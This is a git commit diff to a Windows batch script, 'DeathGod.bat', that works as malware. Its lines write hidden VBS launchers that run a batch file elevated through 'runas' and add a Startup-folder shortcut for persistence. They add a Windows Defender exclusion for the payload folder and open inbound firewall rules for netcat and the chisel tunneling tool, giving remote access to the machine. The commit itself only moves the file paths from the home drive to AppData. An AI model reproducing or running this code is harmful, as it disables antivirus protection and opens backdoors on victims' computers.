a484005ba7b821d4db23a065d63e4919c2024007
L <112792604+l-urk@users.noreply.github.com>
2023-11-06 16:15:45 -0800

    Update DeathGod.bat

--- DeathGod.bat
+++ DeathGod.bat
@@ -11,16 +11,16 @@ echo objShell.Run " %AppData%\ShiniGami\Akuma.bat", 0, False >> %AppData%\Akuma\
 del %AppData%\Akuma\beyondbirthday.vbs
 echo Set objShell = CreateObject("Shell.Application") >> %AppData%\Akuma\beyondbirthday.vbs
 echo objShell.ShellExecute "%AppData%\Akuma\beyondbirthday.bat", "", "", "runas", 0 >> %AppData%\Akuma\beyondbirthday.vbs
-powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\beyondbirthday.lnk');$s.TargetPath='%homedrive%\Akuma\beyondbirthday.vbs';$s.Save()"
+powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\beyondbirthday.lnk');$s.TargetPath='%AppData%\Akuma\beyondbirthday.vbs';$s.Save()"
 echo powershell Add-MpPreference -ExclusionPath "$env:AppData\Akuma" >> %AppData%\Akuma\beyondbirthday.bat
 echo powershell Remove-NetFirewallRule -Name "Akumanc" >> %AppData%\Akuma\beyondbirthday.bat
-echo powershell New-NetFirewallRule -DisplayName "Akumanc" -Direction Inbound -Program "%homedrive%\Akuma\nc\nc.exe" -Action Allow >> %AppData%\Akuma\beyondbirthday.bat
+echo powershell New-NetFirewallRule -DisplayName "Akumanc" -Direction Inbound -Program "%AppData%\Akuma\nc\nc.exe" -Action Allow >> %AppData%\Akuma\beyondbirthday.bat
 echo powershell Remove-NetFirewallRule -Name "Akumachisel" >> %AppData%\Akuma\beyondbirthday.bat
-echo powershell New-NetFirewallRule -DisplayName "Akumachisel" -Direction Inbound -Program "%homedrive%\Akuma\chisel.exe" -Action Allow >> %AppData%\Akuma\beyondbirthday.bat
+echo powershell New-NetFirewallRule -DisplayName "Akumachisel" -Direction Inbound -Program "%AppData%\Akuma\chisel.exe" -Action Allow >> %AppData%\Akuma\beyondbirthday.bat
 echo start %AppData%\Akuma\死神.vbs >> %AppData%\Akuma\beyondbirthday.bat
 echo cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" >> %AppData%\Akuma\beyondbirthday.bat
 echo del "beyondbirthday.lnk" >> %AppData%\Akuma\beyondbirthday.bat
-set "vbsFilePath=%homedrive%\Akuma\beyondbirthday.vbs"
+set "vbsFilePath=%AppData%\Akuma\beyondbirthday.vbs"
 IF EXIST "%vbsFilePath%" (
     start "%vbsFilePath%"
 ) ELSE (
